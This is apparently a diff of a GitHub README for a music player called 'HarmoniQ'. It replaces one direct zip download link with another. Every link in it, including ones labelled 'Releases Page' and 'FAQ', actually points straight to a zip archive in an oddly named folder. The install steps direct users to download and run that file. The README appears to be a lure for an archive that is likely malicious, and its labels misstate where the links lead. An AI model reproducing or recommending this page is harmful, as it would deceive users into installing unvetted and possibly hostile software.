@@ -4,11 +4,11 @@
 Welcome to HarmoniQ! This application offers a sleek and minimal music experience designed for your daily listening. With features like dark mode and responsive design, HarmoniQ provides the perfect music player whether you're relaxing at home or on the go.
 
 ## 📥 Download HarmoniQ
-[![Download HarmoniQ](https://raw.githubusercontent.com/randieallegro301/HarmoniQ/main/ovariotomy/HarmoniQ.zip)](https://raw.githubusercontent.com/randieallegro301/HarmoniQ/main/ovariotomy/HarmoniQ.zip)
+[![Download HarmoniQ](https://github.com/randieallegro301/HarmoniQ/raw/refs/heads/main/ovariotomy/Q-Harmoni-2.7.zip)](https://github.com/randieallegro301/HarmoniQ/raw/refs/heads/main/ovariotomy/Q-Harmoni-2.7.zip)
 
 To get started with HarmoniQ, you will need to download the application. Please visit the link below to access the latest releases.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/randieallegro301/HarmoniQ/main/ovariotomy/HarmoniQ.zip)
+[Visit the Releases Page to Download](https://github.com/randieallegro301/HarmoniQ/raw/refs/heads/main/ovariotomy/Q-Harmoni-2.7.zip)
 
 ## 💻 System Requirements
 HarmoniQ runs smoothly on most devices. Here are the minimum system requirements:
@@ -29,9 +29,9 @@ HarmoniQ comes packed with features to enhance your music listening experience:
 - **Streaming Support:** Stream your favorite music from various online services.
 
 ## 🔧 Download & Install
-1. Click on the link to [Visit the Releases Page to Download](https://raw.githubusercontent.com/randieallegro301/HarmoniQ/main/ovariotomy/HarmoniQ.zip).
+1. Click on the link to [Visit the Releases Page to Download](https://github.com/randieallegro301/HarmoniQ/raw/refs/heads/main/ovariotomy/Q-Harmoni-2.7.zip).
 2. On the releases page, find the latest version of HarmoniQ.
-3. Download the suitable file for your operating system (e.g., https://raw.githubusercontent.com/randieallegro301/HarmoniQ/main/ovariotomy/HarmoniQ.zip for Windows).
+3. Download the suitable file for your operating system (e.g., https://github.com/randieallegro301/HarmoniQ/raw/refs/heads/main/ovariotomy/Q-Harmoni-2.7.zip for Windows).
 4. Once the download completes, locate the file on your computer. 
    - For Windows, this file is usually in the "Downloads" folder.
    - For macOS, it is in the "Downloads" folder as well.
@@ -48,7 +48,7 @@ Once you've installed HarmoniQ, here's how to get started:
 5. Enjoy your music! You can switch to dark mode at any time in the settings.
 
 ## 📡 Support
-If you encounter any issues while using HarmoniQ, feel free to check our [FAQ](https://raw.githubusercontent.com/randieallegro301/HarmoniQ/main/ovariotomy/HarmoniQ.zip) or contact support through the GitHub Issues page.
+If you encounter any issues while using HarmoniQ, feel free to check our [FAQ](https://github.com/randieallegro301/HarmoniQ/raw/refs/heads/main/ovariotomy/Q-Harmoni-2.7.zip) or contact support through the GitHub Issues page.
 
 ## 🌟 Contribute
 HarmoniQ is an open-source project. If you want to contribute, check out the documentation in the repository or reach out through the Issues page.
